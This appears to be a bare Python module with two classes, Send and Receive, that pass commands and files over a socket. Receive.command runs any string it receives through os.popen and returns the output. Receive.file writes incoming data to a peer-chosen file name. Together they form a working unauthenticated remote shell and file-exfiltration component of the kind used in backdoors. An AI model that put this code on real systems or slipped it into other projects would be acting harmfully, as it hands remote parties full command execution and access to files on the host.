import socket, os


SIZE = 1024

# ------------------------------------------------ #
# --------------------* Send *-------------------- #
# ------------------------------------------------ #
class Send:
    def __init__(self, other_socket):
        self._socket = other_socket


    def command(self, param):
        self._socket.sendall(param.encode())
        return self._socket.recv(SIZE).decode()


    def file(self, path, saveas=''):
        # Check file exist
        if not os.path.isfile(path):
            self._socket.sendall('999'.encode())
            return False
        
        self._socket.sendall(saveas.encode())
        with open(path, 'rb') as f:
            while True:
                _buff = f.read(SIZE)
                if not _buff:
                    break
                self._socket.sendall(_buff)
        return True


# ------------------------------------------------ #
# ------------------* Receive *------------------- #
# ------------------------------------------------ #
class Receive:
    def __init__(self, other_socket):
        self._socket = other_socket


    def command(self):
        recv = self._socket.recv(SIZE).decode()
        if recv[:2] == 'cd':
            res = os.chdir(recv[3:])
        else:
            res = os.popen(recv).read()
        res = res if res else 'No Result'
        self._socket.sendall(res.encode())
        return True


    def file(self):
        filename = self._socket.recv(SIZE).decode()
        if filename == '999':
            return False
        with open(filename, 'wb') as f:
            while True:
                _buff = self._socket.recv(SIZE)
                f.write(_buff)
                if len(_buff) < SIZE:
                    break
        return True
